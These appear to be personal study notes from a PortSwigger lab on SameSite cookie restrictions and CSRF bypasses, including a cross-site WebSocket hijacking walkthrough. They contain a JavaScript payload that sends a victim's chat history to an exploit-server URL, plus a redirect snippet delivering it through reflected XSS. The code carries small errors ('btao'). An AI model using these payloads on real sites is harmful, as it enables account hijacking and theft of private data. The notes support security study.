
2024-07-14 22:20

Source: #portswigger 

Tags: [[CSRF]]

`SameSite` is a browser security mechanism that determines when a website's cookies are included in requests originating from other websites.

Since 2021, Chrome applies `Lax` `SameSite` restrictions by default if the website that issues the cookie doesn't explicitly set its own restriction level. 

You may come across the term "effective top-level domain" (`eTLD`). This is just a way of accounting for the reserved multipart suffixes that are treated as top-level domains in practice, such as `.co.uk.` 

If the website issuing the cookie doesn't explicitly set a `SameSite` attribute, Chrome automatically applies `Lax` restrictions by default. This means that the cookie is only sent in cross-site requests that meet specific criteria, even though the developers never configured this behavior.
##### Strict 

If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie. 
##### Lax

 `Lax` `SameSite` restrictions mean that browsers will send the cookie in cross-site requests, but only if both of the following conditions are met:
- The request uses the `GET` method.
- The request resulted from a top-level navigation by the user, such as clicking on a link.
##### None

- If a cookie is set with the `SameSite=None` attribute, this effectively disables `SameSite` restrictions altogether, regardless of the browser. 
- There are legitimate reasons for disabling `SameSite`, such as when the cookie is intended to be used from a third-party context and doesn't grant the bearer access to any sensitive data or functionality. Tracking cookies are a typical example. 
- When setting a cookie with SameSite=None, the website must also include the Secure attribute, which ensures that the cookie is only sent in encrypted messages over HTTPS.
#### Bypassing SameSite Lax restrictions using GET requests

If servers also use `Lax` restrictions for their session cookies, either explicitly or due to the browser default, you may still be able to perform a CSRF attack by eliciting a `GET` request from the victim's browser. 
As long as the request involves a top-level navigation, the browser will still include the victim's session cookie. 

Even if an ordinary `GET` request isn't allowed, some frameworks provide ways of overriding the method specified in the request line. For example, `Symfony` supports the `_method `parameter in forms, which takes precedence over the normal method for routing purposes
#### Bypassing SameSite restrictions using on-site gadgets

- If a cookie is set with the` SameSite=Strict` attribute, browsers won't include it in any cross-site requests. You may be able to get around this limitation if you can find a gadget that results in a secondary request within the same site. 
- One possible gadget is a client-side redirect that dynamically constructs the redirection target using attacker-controllable input like URL parameters.
- Note that the equivalent attack is not possible with server-side redirects. 
If the site is redirecting then find a script that is doing the redirect, study the script, find a parameter that we can manipulate, then do directory traversal 
#### Bypassing SameSite restrictions via vulnerable sibling domains

In addition to classic `CSRF`, don't forget that if the target website supports `WebSockets`, this functionality might be vulnerable to cross-site WebSocket hijacking (CSWSH), which is essentially just a CSRF attack targeting a WebSocket handshake. 
##### Lab:
in the lab we have a chat feature that uses websockets, when capturing the request on burp we see that we send a ready message and the websocket server responds with the entire chat history that is tied to our session cookie
in http history find a response that mentions switching protocol in that corresponding request check if the request contains all the points for it to be CSRF vulnerable. 
###### samesite: None
 
with no restrictions we can add the following script on our website 
once the victim has visited the page we see that we can see the chat message from our victim now but because of the same site equals strict session cookie restriction we're only seeing chat messages or the chat message for a new chat session.

```
<script>
var webSocket = new WebSocket("lab-url/chat");

webSocket.onopen = function(evt){
	webSocket.send("READY");
};

webSocket.onmessage = function(evt){
	var message = evt.data;
	fetch("exploit-server-url/exploit?message=")+btao(message);
};
</script>
```
###### samesite: Strict

- If our application was something like a Blog I would look for the comments section and I would check whether the any of the fields in the comment section are vulnerable to a stored cross-site scripting attack because that way we could store our payload in there and send our victim a link to the post that includes our payload that we injected through cross-site scripting
- but our application is just a product page 

- we see for request with `chat.js` for example we can see that the response header `Access-Control-allow-origin` here reveals an additional sibling domain and it's hosted on the same main domain
- If there was a stored cross-site scripting or reflected cross-site scripting vulnerability within this endpoint it would still honor the same site restriction
- since there is a reflected xss vuln on the new domain 
- we see that the login (new domain) endpoint also accepts our payload as a get request
- the payload we used in `samesite: None` can be used on the new domain
- we url encode the whole payload and add it to the url of the new domain 
- when crafting the payload on the exploit server we write
```
<script>
	document.location="newdomain-url/urlencoded-payload";
</script>
```
#### Bypassing SameSite Lax restrictions with newly issued cookies